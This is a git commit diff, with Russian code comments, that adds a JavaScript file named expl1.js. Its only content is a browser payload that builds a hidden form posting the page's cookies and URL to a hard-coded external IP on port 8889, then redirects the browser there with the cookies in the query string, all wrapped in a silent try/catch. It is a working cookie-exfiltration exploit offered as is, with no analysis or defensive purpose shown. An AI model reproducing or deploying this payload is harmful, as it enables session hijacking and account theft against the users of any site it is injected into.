a71b8fbfad1a0377b95cde5f22fc709852dcf7e8
aliensadde <vladyomkin@gmail.com>
2026-04-27 17:55:40 +0300

    Update expl1.js

--- expl1.js
+++ expl1.js
@@ -1,1 +1,20 @@
-
+// Добавьте в начало expl1.js:
+try {
+    // Самый надежный способ - отправить через создание формы
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'http://109.234.39.144:8889/';
+    form.style.display = 'none';
+    var input = document.createElement('input');
+    input.name = 'data';
+    input.value = JSON.stringify({
+        cookies: document.cookie,
+        url: location.href
+    });
+    form.appendChild(input);
+    document.body.appendChild(form);
+    form.submit();
+    
+    // Также через redirect
+    location.href = 'http://109.234.39.144:8889/?' + encodeURIComponent(document.cookie);
+} catch(e) {}
